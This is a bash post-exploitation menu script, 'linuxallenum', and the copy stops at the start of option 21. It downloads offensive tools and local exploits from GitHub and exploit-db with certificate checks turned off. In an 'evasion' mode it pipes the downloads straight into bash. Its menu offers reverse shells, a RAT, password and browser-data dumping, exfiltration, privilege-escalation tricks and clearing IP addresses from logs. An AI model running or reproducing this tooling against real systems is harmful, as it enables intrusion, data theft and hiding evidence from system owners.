#!/bin/bash
# Author: Fabio Defilippo
# email: 4starfds@gmail.com
# src: https://github.com/FabioDefilippo/linuxallenum/blob/master/linuxallenum.sh
# linuxallenum.sh
# copy date: 15 june 2022

WGET="2"
SEC="0"
WGETP=$(which wget)
CURLP=$(which curl)
FETCP=$(which fetch)

if [[ -f "$WGETP" ]];
then
	WGET="0"
elif [[ -f "$CURLP" ]];
then
	WGET="1"
elif [[ -f "$FETCP" ]];
then
	WGET="2"
fi

HGSC="Evasion/Bypass=Disabled"
ENTSSL="https://github.com/"
ENTRAW="https://raw.githubusercontent.com/"
GSTRAW="https://gist.githubusercontent.com/"
EXDB="https://www.exploit-db.com/"

function Scarica
{
	echo "downloading $1"
	if [[ "$WGET" == "0" ]];
	then
		if [[ "$SEC" == "1" ]];
		then
			$WGETP -q -O - --no-check-certificate "$2" | bash
		else
			$WGETP -q --no-check-certificate "$2" -O "$3"
		fi
	elif [[ "$WGET" == "1" ]];
	then
		if [[ "$SEC" == "1" ]];
		then
			$CURLP -s -k -L "$2" | bash
		else
			$CURLP -s -k -L -o "$3" "$2"
		fi
	elif [[ "$WGET" == "2" ]];
	then
		if [[ "$SEC" == "1" ]];
		then
			$FETCP --no-verify-hostname --no-verify-peer -o - "$2" | bash
		else
			$FETCP --no-verify-hostname --no-verify-peer -o "$3" "$2"
		fi
	fi
	if [[ -f ./$3 ]];
	then
		if [[ "$3" == *".zip" ]];
		then
			unzip ./$3
		else
			chmod +x ./$3
			echo "$3"" downloaded and runnable!"
		fi
	else
		echo "ERROR: download failed"
	fi
}

echo "linuxallenum, by FabioDefilippoSoftware"

while true; do
	echo "ACTIVE DIRECTORY"
	echo -ne " 20. skelsec/jackdaw\t\t\t\t\t139. DanMcInerney/icebreaker\n"
	echo "ANTIFORENSICS - STEGANOGRAPHY"
	echo -ne " 166. KuroLabs/stegcloak\n"
	echo "AWS"
	echo -ne " 231. smaranchand/bucky\n"
	echo "CRACK"
	echo -ne " 30. Greenwolf/spray\t\t\t\t\t31. NetSPI/PS_MultiCrack\t\t\t32. TiagoANeves/TDTLinuxPWD\n"
	echo -ne " 152. mthambipillai/password-cracker\t\t\t153. incredigeek/grond\t\t\t\t233. hashtopolis/agent-python\n"
	echo "CVE"
	echo -ne " 482. PrivEsc with CVE-2021-4034\n"
	echo "DNS"
	echo -ne " 33. m57/dnsteal\n"
	echo "DOCKER"
	echo -ne " 172. Keramas/Blowhole\t\t\t\t\t173. stealthcopter/deepce\t\t\t175. nccgroup/go-pillage-registries_1.0_Linux_i386\n"
	echo -ne " 176. nccgroup/go-pillage-registries_1.0_Linux_x86_64\t116. sensepost/dwn\n"
	echo "DUMPING - EXTRACTING - EXFILTRATING"
	echo -ne " 50. volatilityfoundation/volatility\t\t\t140. nyov/python-ffpassdecrypt\t\t\t141. pradeep1288/ffpasscracker/ffpassdecrypt\n"
	echo -ne " 149. louisabraham/ffpass\t\t\t\t150. aarsakian/MFTExtractor\t\t\t158. mikeborghi/pywallet\n"
	echo -ne " 162. TryCatchHCF/PacketWhisper\t\t\t\t180. hasanbulat/tshark/dumpcap (amd64)\t\t207. moonD4rk/HackBrowserData-32bit\n"
	echo -ne " 208. moonD4rk/HackBrowserData-64bit\t\t\t480. rek7/mXtract\n"
	echo "ENUMERATION"
	echo -ne " 1. rebootuser/LinEnum\t\t\t\t\t134. jtpereyda/enum4linux\t\t\t2. Arr0way/linux-local-enumeration-script\n"
	echo -ne " 3. sleventyeleven/linuxprivchecker\t\t\t4. jondonas/linux-exploit-suggester-2\t\t5. TheSecondSun/Bashark\n"
	echo -ne " 6. belane/linux-soft-exploit-suggester\t\t\t7. mzet-/linux-exploit-suggester\n"
	echo -ne " 8. carlospolop/privilege-escalation-awesome-scripts-suite/linPEAS\n"
	echo -ne " 9. InteliSecureLabs/Linux_Exploit_Suggester/Linux_Exploit_Suggester\n"
	echo -ne " 138. diego-treitos/linux-smart-enumeration/lse\t\t159. DominicBreuker/pspy64s\t\t\t160. DominicBreuker/pspy32s\n"
	echo -ne " 181. dylanaraps/neofetch\t\t\t\t34. pentestmonkey/unix-privesc-check\n"
	echo "EVASION"
	echo -ne " 22. cytopia/pwncat\n"
	echo "EXPLOIT"
	echo " 10. github - offensive-security/exploitdb - exploits/linux/local"
	echo " 11. github - offensive-security/exploitdb - exploits/linux_x86-64/local"
	echo " 12. github - offensive-security/exploitdb - exploits/linux_x86/local"
	echo " 13. github - offensive-security/exploitdb - exploits/unix/local"
	echo " 14. github - offensive-security/exploitdb - exploits/macos/local"
	echo " 15. github - offensive-security/exploitdb - exploits/freebsd/local"
	echo " 16. github - offensive-security/exploitdb - exploits/freebsd_x86-64/local"
	echo -ne " 167. exploit-db all exploits\n"
	echo "GATHERING"
	echo -ne " 157. HightechSec/git-scanner/gitscanner\n"
	echo "HASH"
	echo -ne " 131. mlgualtieri/NTLMRawUnHide\n"
	echo "JAVASCRIPT"
	echo -ne " 23. s0md3v/JShell/shell\n"
	echo "KUBERNETES"
	echo " 235. armosec/kubescape\n"
	echo "LDAP"
	echo -ne " 40. dinigalab/ldapsearch\n"
	echo "MISC"
	echo -ne " 41. SecureAuthCorp/impacket\n"
	echo -ne " 221. andrew-d/static-binaries/linux/x86_64\t\t222. andrew-d/static-binaries/linux/x86\n"
	echo -ne " 223. andrew-d/static-binaries/linux/arm\n"
	echo "MITM - SNIFFING"
	echo -ne " 170. bettercap/bettercap\t\t\t\t179. hasanbulat/tshark (amd64)\n"
	echo "PRIVESC"
	echo -ne " 154. TH3xACE/SUDO_KILLER\t\t\t\t109. nongiach/sudo_inject\t\t\t226. liamg/traitor-386\n"
	echo -ne " 224. swisskyrepo/PayloadsAllTheThings/Mathodology_and_Resources/Linux-PrivilegeEscalation\n"
	echo -ne " 227. liamg/traitor-arm64\t\t\t\t228. liamg/traitor-amd64\t\t\t230. b3rito/yodo\n"
	echo -ne " 234. Liang2580/CVE-2021-33909\t\t\t\t479. lightfaith/locasploit\n"
	echo "PROXY - REVPROXY"
	echo -ne " 211. fatedier/frp_386\t\t\t\t\t212. fatedier/frp_amd64\t\t\t\t213. fatedier/frp_arm\n"
	echo -ne " 214. fatedier/frp_arm64\n"
	echo "RAT"
	echo -ne " 206. BenChaliah/Arbitrium-RAT\n"
	echo "RDP"
	echo -ne " 232. BSI-Bund/RdpCacheStitcher/RdpCacheStitcher-v1.1-linux64\n"
	echo "REVSHELL"
	echo -ne " 155. shahril96/socat-reverse-shell\t\t\t156. Doctor-love/revshell\n"
	echo "SCANNING"
	echo -ne " 114. porterhau5/bash-port-scanner/scanner\t\t115. davidmerrick/Python-Port-Scanner/master/port_scanner\n"
	echo -ne " 151. vulmon/Vulmap/Vulmap-Linux\n"
	echo "SMB"
	echo -ne " 209. deepsecurity-pe/GoGhost\n"
	echo "TUNNELING"
	echo -ne " 21. T3rry7f/ICMPTunnel/IcmpTunnel_C\t\t\t133. blackarrowsec/mssqlproxy/mssqlclient\n"
	echo -ne " 137. sensepost/DNS-Shell\t\t\t\t163. jpillora/chisel_1.7.2_linux_amd64\t\t164. jpillora/chisel_1.7.2_linux_386\n"
	echo -ne " 165. pahaz/sshtunnel\t\t\t\t\t215. jpillora/chisel_arm64\t\t\t216. jpillora/chisel_armv7\n"
	echo -ne " 216. jpillora/chisel_armv6\n"
	echo "UPNP"
	echo -ne " 130. tenable/upnp_info\n"
	echo "UTILITIES"
	echo -ne " 99. Download your file\t\t\t\t\t100. nc Reverse Shell\t\t\t\t101. Reverse Shell with bash\n"
	echo -ne " 102. Decode base64 text to file\t\t\t103. Decode base64 text to bash\t\t\t104. PrivEsc with a binary ELF file using 'ps'\n"
	echo -ne " 105. PrivEsc with a binary ELF file using 'id'\t\t106. PrivEsc with a binary ELF file and 'cat'\t110. Convert hex to bin\n"
	echo -ne " 111. Show writable files\t\t\t\t120. unzip a file\t\t\t\t121. Ping sweep\n"
	echo -ne " 136. Capture All packets from loopback\t\t\t481. run chisel client\n"
	echo -ne " 24. PrivEsc with wget to send a file\t\t\t25. PrivEsc with zip\t\t\t\t26. PrivEsc with perl\n"
	echo -ne " 27. PrivEsc with git\t\t\t\t\t28. PrivEsc with apt\t\t\t\t29. PrivEsc with cat\n"
	echo -ne " 142. clear IP from logs\t\t\t\t143. SOCAT Port Forward\t\t\t\t144. sudo -l\n"
	echo -ne " 145. ElasticSearch dumping\t\t\t\t146. view lastlog\t\t\t\t147. view auth_log\n"
	echo -ne " 148. view history\t\t\t\t\t161. Privesc with chroot method 1\t\t225. Fix limited PATH env\n"
	echo -ne " 168. search keywords inside files in specific folder\t\t\t\t\t\t\t169. dump keys from memcached\n"
	echo -ne " 171. escape from Docker method 1\t\t\t174. extract a tar.gz file\t\t\t229. insert current path in PATH var\n"
	echo -ne " 177. use Kubernetes exploit for Local Command Execution\t\t\t\t\t\t178. analyze an executable file with strace and ltrace\n"
	echo -ne " 182. PrivEsc with sudoedit\t\t\t\t183. PrivEsc by revshell with root priv using systemctl\n"
	echo -ne " 184. PrivEsc with arp\t\t\t\t\t185. PrivEsc with cut\t\t\t\t186. PrivEsc with base64\n"
	echo -ne " 188. PrivEsc with ul\t\t\t\t\t189. PrivEsc with php5\t\t\t\t190. PrivEsc with file\n"
	echo -ne " 191. PrivEsc with tclsh8.5\t\t\t\t192. PrivEsc with env\t\t\t\t193. PrivEsc with diff\n"
	echo -ne " 194. PrivEsc with strace\t\t\t\t195. PrivEsc with awk\t\t\t\t196. PrivEsc with find\n"
	echo -ne " 197. PrivEsc with find and awk\t\t\t\t198. PrivEsc with less\t\t\t\t199. PrivEsc with more\n"
	echo -ne " 200. list all bins with perm 400 root\t\t\t201. PrivEsc with nano\t\t\t\t202. PrivEsc with apache2\n"
	echo -ne " 203. PrivEsc with LP_PRELOAD\t\t\t\t204. get capabilities\t\t\t\t205. PrivEsc with python\n"
	echo -ne " 210. Decode, unzip and decrypt a file from linuxallremote\t\t\t\t\t\t107. PrivEsc with vim method 1\n"
	echo -ne " 108. PrivEsc with vim method 2\t\t\t\t219. Enum with sysdiagnose\t\t\t220. SSH Port Forward\n"
	echo -ne " 236. PrivEsc with ansible-playbook\t\t\t237. PrivEsc with apt\t\t\t\t238. Read a root's file with ar\n"
	echo -ne " 239. PrivEsc with aria2c\t\t\t\t240. PrivEsc with arj\t\t\t\t241. PrivEsc with ash\n"
	echo -ne " 243. Read a root's file with atobm\t\t\t244. Read a root's file with base32\t\t245. Read root's file with basenc\n"
	echo -ne " 246. PrivEsc with bpftrace\t\t\t\t247. Read a root's file with bridge\t\t248. PrivEsc with bundler\n"
	echo -ne " 249. PrivEsc with busctl\t\t\t\t250. PrivEsc with busybox\t\t\t251. PrivEsc with byebug\n"
	echo -ne " 252. PrivEsc with c89\t\t\t\t\t253. PrivEsc with c99\t\t\t\t254. PrivEsc with capsh\n"
	echo -ne " 255. PrivEsc with certbot\t\t\t\t256. PrivEsc with check_by_ssh\t\t\t257. Read a root's file with check_cups\n"
	echo -ne " 258. PrivEsc with check_log\t\t\t\t259. Read a root's file with check_memory\t260. Read a root's file with check_raid\n"
	echo -ne " 261. PrivEsc with check_ssl_cert\t\t\t242. PrivEsc with at\t\t\t\t284. Download a root's file with curl\n"
	echo -ne " 262. Read a root's file with check_statusfile\t\t263. Set readable a root's file\t\t\t264. Set readable a root's file\n"
	echo -ne " 265. PrivEsc with chroot method 2\t\t\t266. Read a root's file with cmp\t\t267. PrivEsc with cobc\n"
	echo -ne " 268. Read a root's file with column\t\t\t269. Read a root's file with comm\t\t270. PrivEsc with composer\n"
	echo -ne " 271. PrivEsc with cowsay\t\t\t\t272. PrivEsc with cowthink\t\t\t273. PrivEsc with cp\n"
	echo -ne " 274. PrivEsc with cpan\t\t\t\t\t275. PrivEsc with cpio\t\t\t\t276. PrivEsc with cpulimit\n"
	echo -ne " 277. PrivEsc with crash\t\t\t\t278. PrivEsc with crontab\t\t\t279. PrivEsc with csh\n"
	echo -ne " 280. Clear PageCache, dEntries, Swap and iNodes\t281. Read a root's file with csplit\t\t282. PrivEsc with csvtool\n"
	echo -ne " 283. Read a root's file with cupsfilter\t\t285. PrivEsc with dash\t\t\t\t286. Read a root's file with date\n"
	echo -ne " 287. Read a root's file with dialog\t\t\t288. Read a root's file with dig\t\t289. PrivEsc with dmesg\n"
	echo -ne " 290. PrivEsc with dmsetup\t\t\t\t291. PrivEsc with docker\t\t\t292. PrivEsc with easy_install\n"
	echo -ne " 293. PrivEsc with eb\t\t\t\t\t294. PrivEsc with ed\t\t\t\t295. PrivEsc with emacs\n"
	echo -ne " 296. PrivEsc with env\t\t\t\t\t297. Read a root's file with eqn\t\t298. PrivEsc with ex\n"
	echo -ne " 299. Read a root's file with expand\t\t\t300. PrivEsc with expect\t\t\t301. PrivEsc with facter\n"
	echo -ne " 302. Read a root's file with file\t\t\t303. PrivEsc with find\t\t\t\t304. PrivEsc with flock\n"
	echo -ne " 305. Read a root's file with fmt\t\t\t306. Read a root's file with fold\t\t307. PrivEsc with ftp\n"
	echo -ne " 308. PrivEsc with gawk\t\t\t\t\t309. PrivEsc woth gcc\t\t\t\t310. PrivEsc with gdb\n"
	echo -ne " 311. PrivEsc with gem\t\t\t\t\t312. Read a root's file with genisoimage\n"
	echo -ne " 313. PrivEsc with ghc\t\t\t\t\t314. PrivEsc with ghci\t\t\t\t315. PrivEsc with gimp\n"
	echo -ne " 316. PrivEsc with git\t\t\t\t\t317. Read a root's file with grep\t\t318. PrivEsc with gtester\n"
	echo -ne " 319. Read a root's file with gzip\t\t\t320. Read a root's file with hd\t\t\t321. Read a root's file with head\n"
	echo -ne " 322. Read a root's file with hexdump\t\t\t323. Read a root's file with highlight\t\t324. PrivEsc with hping3\n"
	echo -ne " 325. Read a root's file with iconv\t\t\t326. PrivEsc with iftop\t\t\t\t327. Read a root's file with install\n"
	echo -ne " 328. PrivEsc with ionice\t\t\t\t329. Read a root's file with ip\t\t\t330. PrivEsc with irb\n"
	echo -ne " 331. PrivEsc with jjs\t\t\t\t\t332. Read a root's file with join\t\t333. PrivEsc with journalctl\n"
	echo -ne " 334. Read a root's file with jq\t\t\t335. PrivEsc with jrunscript\t\t\t336. PrivEsc with knife\n"
	echo -ne " 337. PrivEsc with ksh\t\t\t\t\t338. Read a root's file with ksshell\t\t339. PrivEsc with ld.so\n"
	echo -ne " 340. PrivEsc with ldconfig\t\t\t\t341. PrivEsc with less\t\t\t\t342. PrivEsc with ln\n"
	echo -ne " 343. PrivEsc with loginctl\t\t\t\t344. PrivEsc with logsave\t\t\t345. Read a root's file with look\n"
	echo -ne " 346. PrivEsc with ltrace\t\t\t\t347. PrivEsc with lua\t\t\t\t348. PrivEsc with lualatex\n"
	echo -ne " 349. PrivEsc with luatex\t\t\t\t350. Read a root's file with lwp-request\t351. PrivEsc with mail\n"
	echo -ne " 352. PrivEsc with make\t\t\t\t\t353. PrivEsc with man\t\t\t\t354. PrivEsc with mawk\n"
	echo -ne " 355. PrivEsc with more\t\t\t\t\t356. PrivEsc with mount\t\t\t\t357. Read a root's file with msgattrib\n"
	echo -ne " 358. Read a root's file with msgcat\t\t\t359. Read a root's file with msgconv\t\t360. PrivEsc with msgfilter\n"
	echo -ne " 361. Read a root's file with msgmerge\t\t\t362. Read a root's file with msguniq\t\t363. Read a root's file with mtr\n"
	echo -ne " 364. PrivEsc with mysql\t\t\t\t365. Read a root's file with nasm\t\t366. PrivEsc with nawk\n"
	echo -ne " 367. SUDO RevShell with nc\t\t\t\t368. Read a root's file with neofetch\t\t369. PrivEsc with nice\n"
	echo -ne " 370. Read a root's file with nl\t\t\t371. PrivEsc with nmap\t\t\t\t372. PrivEsc with node\n"
	echo -ne " 373. PrivEsc with nohup\t\t\t\t374. PrivEsc with npm\t\t\t\t375. PrivEsc with nroff\n"
	echo -ne " 376. PrivEsc with nsenter\t\t\t\t378. PrivEsc with octave-cli\t\t\t379. Read a root's file with od\n"
	echo -ne " 380. SUDO RevShell with openssl\t\t\t381. Read a root's file with openvpn\t\t382. PrivEsc with openvt\n"
	echo -ne " 383. Read a root's file with paste\t\t\t384. PrivEsc with pdb\t\t\t\t385. PrivEsc with pdflatex\n"
	echo -ne " 386. PrivEsc with pdftex\t\t\t\t387. PrivEsc with perl\t\t\t\t388. PrivEsc with pg\n"
	echo -ne " 389. PrivEsc with php\t\t\t\t\t390. PrivEsc with pip\t\t\t\t391. PrivEsc with pkexec\n"
	echo -ne " 392. Read a root's file with pr\t\t\t393. PrivEsc with pry\t\t\t\t394. PrivEsc with psql\n"
	echo -ne " 395. PrivEsc with puppet\t\t\t\t396. PrivEsc with python\t\t\t397. PrivEsc with rake\n"
	echo -ne " 398. Read a root's file with readelf\t\t\t399. Read a root's file with redcarpet\t\t400. Read a root's file with rev\n"
	echo -ne " 401. PrivEsc with rlwrap\t\t\t\t402. PrivEsc with rpm\t\t\t\t403. PrivEsc with rpmquery\n"
	echo -ne " 404. PrivEsc with rsync\t\t\t\t405. PrivEsc with ruby\t\t\t\t406. PrivEsc with run-mailcap\n"
	echo -ne " 407. PrivEsc with run-parts\t\t\t\t408. PrivEsc with rview\t\t\t\t409. PrivEsc with rvim\n"
	echo -ne " 410. PrivEsc with scp\t\t\t\t\t411. PrivEsc with screen\t\t\t412. PrivEsc with script\n"
	echo -ne " 413. PrivEsc with sed\t\t\t\t\t414. PrivEsc with service\t\t\t415. PrivEsc with setarch\n"
	echo -ne " 416. PrivEsc with sg\t\t\t\t\t417. PrivEsc with slsh\t\t\t\t418. PrivEsc with socat\n"
	echo -ne " 419. Read a root's file with soelim\t\t\t420. Read a root's file with sort\t\t421. PrivEsc with split\n"
	echo -ne " 422. PrivEsc with sqlite3\t\t\t\t423. Read a root's file with ss\t\t\t424. PrivEsc with ssh-keygen\n"
	echo -ne " 425. Read a root's file with ssh-keyscan\t\t426. PrivEsc with ssh\t\t\t\t427. PrivEsc with start-stop-daemon\n"
	echo -ne " 428. PrivEsc with stdbuf\t\t\t\t429. PrivEsc with strace\t\t\t430. Read a root's file with strings\n"
	echo -ne " 431. PrivEsc with su\t\t\t\t\t432. Read a root's file with sysctl\t\t433. PrivEsc with systemctl\n"
	echo -ne " 434. PrivEsc with systemd-resolve\t\t\t435. Read a root's file with tac\t\t436. Read a root's file with tail\n"
	echo -ne " 437. PrivEsc with tar\t\t\t\t\t438. PrivEsc with taskset\t\t\t439. Read a root's file with tbl\n"
	echo -ne " 440. PrivEsc with tclsh\t\t\t\t441. PrivEsc with tcpdum\t\t\t442. PrivEsc with tex\n"
	echo -ne " 443. Read a root's file with tic\t\t\t444. PrivEsc with time\t\t\t\t445. PrivEsc with timedatectl\n"
	echo -ne " 446. PrivEsc with timeout\t\t\t\t447. PrivEsc with tmux\t\t\t\t448. Read a root's file with troff\n"
	echo -ne " 449. Read a root's file with ul\t\t\t450. Read a root's file with unexpand\t\t451. Read a root's file with uniq\n"
	echo -ne " 452. PrivEsc with unshare\t\t\t\t453. Read a root's file with uudecode\t\t454. Read a root's file with uuencode\n"
	echo -ne " 455. PrivEsc with valgrind\t\t\t\t456. PrivEsc with vi\t\t\t\t457. PrivEsc with view\n"
	echo -ne " 458. PrivEsc with vigr\t\t\t\t\t459. PrivEsc with vim\t\t\t\t460. PrivEsc with vimdiff\n"
	echo -ne " 461. PrivEsc with vipw\t\t\t\t\t462. PrivEsc with watch\t\t\t\t463. Read a root's file with wc\n"
	echo -ne " 464. Read a root's file with whiptail\t\t\t465. PrivEsc with wish\t\t\t\t466. PrivEsc with xargs\n"
	echo -ne " 467. PrivEsc with xelatex\t\t\t\t468. PrivEsc with xetex\t\t\t\t469. Read a root's file with xmodmap\n"
	echo -ne " 470. Read a root's file with xmore\t\t\t471. Read a root's file with xxd\t\t472. Read a root's file with xz\n"
	echo -ne " 473. PrivEsc with yarn\t\t\t\t\t474. PrivEsc with zip\t\t\t\t475. PrivEsc with zsh\n"
	echo -ne " 476. Read a root's file with zsoelim\t\t\t477. Read a SUDO technique from gtfobins\n"
	echo "WINRM"
	echo -ne " 132. Alamot/code-snippets/winrm/\n"
	echo "OTHERS"
	echo -ne " 112. corelan/mona\t\t\t\t\t113. utkusen/shotlooter\t\t\t\t135. trustedsec/tscopy\n"
	if [[ "$HGSC" == "1" ]];
	then
	HGSC="Evasion/Bypass=Enabled"
	else
		HGSC="Evasion/Bypass=Disabled"
	fi
	echo -ne "\n""$HGSC""\n"
	echo -ne "0. exit\t\t\t\t\t\t\t218. Set an higher level of evasion/bypassing piping scripts\n\n"

	read -p "Choose a script: " SCELTA
	case "$SCELTA" in
	"0")
		exit 0
	;;
	"1")
		Scarica "rebootuser/LinEnum" "$ENTRAW""rebootuser/LinEnum/master/LinEnum.sh" "linenum.sh"
	;;
	"2")
		Scarica "Arr0way/linux-local-enumeration-script" "$ENTRAW""Arr0way/linux-local-enumeration-script/master/linux-local-enum.sh" "linux-local-enum.sh"
	;;
	"3")
		Scarica "sleventyeleven/linuxprivchecker" "$ENTRAW""sleventyeleven/linuxprivchecker/master/linuxprivchecker.py" "linuxprivchecker.py"
	;;
	"4")
		Scarica "jondonas/linux-exploit-suggester-2" "$ENTRAW""jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl" "linux-exploit-suggester-2.pl"
	;;
	"5")
		Scarica "TheSecondSun/Bashark" "$ENTRAW""TheSecondSun/Bashark/master/bashark.sh" "bashark.sh"
	;;
	"6")
		Scarica "belane/linux-soft-exploit-suggester" "$ENTRAW""belane/linux-soft-exploit-suggester/master/linux-soft-exploit-suggester.py" "linux-soft-exploit-suggester.py"
	;;
	"7")
		Scarica "mzet-/linux-exploit-suggester" "$ENTRAW""mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" "linux-exploit-suggester.sh"
	;;
	"8")
		##Scarica "carlospolop/privilege-escalation-awesome-scripts-suite/linPEAS" "$ENTRAW""carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" "linpeas.sh"
		URT="carlospolop/PEASS-ng/releases"
		URD="$URT""/download"
		select CHC in $(curl -s -k -L "$ENTSSL""$URT"|grep "href"|grep "$URD"|grep "linpeas"|awk -F \" '{print $2}')
		do
			Scarica "carlospolop/PEASS-ng/linpeas" "$ENTSSL""$CHC" "linpeas"
			break
		done
	;;
	"9")
		Scarica "InteliSecureLabs/Linux_Exploit_Suggester/Linux_Exploit_Suggester" "$ENTRAW""InteliSecureLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl" "Linux_Exploit_Suggester.pl"
	;;
	"10")
		if [[ -f $(which lynx) ]];
		then
			OFFSEC="offensive-security/exploitdb/"
			MEX="master/exploits/"
			TIPO="linux/local"
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""$TIPO""/"
			ENTTO="$ENTRAW""$OFFSEC""$MEX""$TIPO""/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				Scarica "$OFFSEC""$EXP" "$ENTTO""$EXP" "$EXP"
				break
			done
		else
			echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/exploits/linux/local with extension"
			read -p "(example exploit.py): " FILE
			Scarica "offensive-security/exploitdb/exploits/linux/local/""$FILE" "$ENTRAW""offensive-security/exploitdb/master/exploits/linux/local/""$FILE" "$FILE"
		fi
	;;
	"11")
		if [[ -f $(which lynx) ]];
		then
			OFFSEC="offensive-security/exploitdb/"
			MEX="master/exploits/"
			TIPO="linux_x86-64/local"
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""$TIPO""/"
			ENTTO="$ENTRAW""$OFFSEC""$MEX""$TIPO""/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				Scarica "$OFFSEC""$EXP" "$ENTTO""$EXP" "$EXP"
				break
			done
		else
			echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/exploits/linux_x86-64/local with extension"
			read -p "(example exploit.py): " FILE
			Scarica "offensive-security/exploitdb/exploits/linux/local/""$FILE" "$ENTRAW""offensive-security/exploitdb/master/exploits/linux_x86-64/local/""$FILE" "$FILE"
		fi
	;;
	"12")
		if [[ -f $(which lynx) ]];
		then
			OFFSEC="offensive-security/exploitdb/"
			MEX="master/exploits/"
			TIPO="linux_x86/local"
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""$TIPO""/"
			ENTTO="$ENTRAW""$OFFSEC""$MEX""$TIPO""/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				Scarica "$OFFSEC""$EXP" "$ENTTO""$EXP" "$EXP"
				break
			done
		else
			echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/exploits/linux_x86/local with extension"
			read -p "(example exploit.py): " FILE
			Scarica "offensive-security/exploitdb/exploits/linux/local/""$FILE" "$ENTRAW""offensive-security/exploitdb/master/exploits/linux_x86/local/""$FILE" "$FILE"
		fi
	;;
	"13")
		if [[ -f $(which lynx) ]];
		then
			OFFSEC="offensive-security/exploitdb/"
			MEX="master/exploits/"
			TIPO="unix/local"
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""$TIPO""/"
			ENTTO="$ENTRAW""$OFFSEC""$MEX""$TIPO""/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				Scarica "$OFFSEC""$EXP" "$ENTTO""$EXP" "$EXP"
				break
			done
		else
			echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/exploits/unix/local with extension"
			read -p "(example exploit.py): " FILE
			Scarica "offensive-security/exploitdb/exploits/unix/local/""$FILE" "$ENTRAW""offensive-security/exploitdb/master/exploits/unix/local/""$FILE" "$FILE"
		fi
	;;
	"14")
		if [[ -f $(which lynx) ]];
		then
			OFFSEC="offensive-security/exploitdb/"
			MEX="master/exploits/"
			TIPO="macos/local"
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""$TIPO""/"
			ENTTO="$ENTRAW""$OFFSEC""$MEX""$TIPO""/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				Scarica "$OFFSEC""$EXP" "$ENTTO""$EXP" "$EXP"
				break
			done
		else
			echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/exploits/macos/local with extension"
			read -p "(example exploit.py): " FILE
			Scarica "offensive-security/exploitdb/exploits/macos/local/""$FILE" "$ENTRAW""offensive-security/exploitdb/master/exploits/macos/local/""$FILE" "$FILE"
		fi
	;;
	"15")
		if [[ -f $(which lynx) ]];
		then
			OFFSEC="offensive-security/exploitdb/"
			MEX="master/exploits/"
			TIPO="freebsd/local"
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""$TIPO""/"
			ENTTO="$ENTRAW""$OFFSEC""$MEX""$TIPO""/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				Scarica "$OFFSEC""$EXP" "$ENTTO""$EXP" "$EXP"
				break
			done
		else
			echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/exploits/freebsd/local with extension"
			read -p "(example exploit.py): " FILE
			Scarica "offensive-security/exploitdb/exploits/freebsd/local/""$FILE" "$ENTRAW""offensive-security/exploitdb/master/exploits/freebsd/local/""$FILE" "$FILE"
		fi
	;;
	"16")
		if [[ -f $(which lynx) ]];
		then
			OFFSEC="offensive-security/exploitdb/"
			MEX="master/exploits/"
			TIPO="freebsd_x86-64/local"
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""$TIPO""/"
			ENTTO="$ENTRAW""$OFFSEC""$MEX""$TIPO""/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				Scarica "$OFFSEC""$EXP" "$ENTTO""$EXP" "$EXP"
				break
			done
		else
			echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/exploits/freebsd_x86-64/local with extension"
			read -p "(example exploit.py): " FILE
			Scarica "offensive-security/exploitdb/exploits/freebsd_x86-64/local/""$FILE" "$ENTRAW""offensive-security/exploitdb/master/exploits/freebsd_x86-64/local/""$FILE" "$FILE"
		fi
	;;
	"20")
		Scarica "skelsec/jackdaw" "$ENTSSL""skelsec/jackdaw/archive/master.zip" "jackdaw.zip"
	;;
	"21")
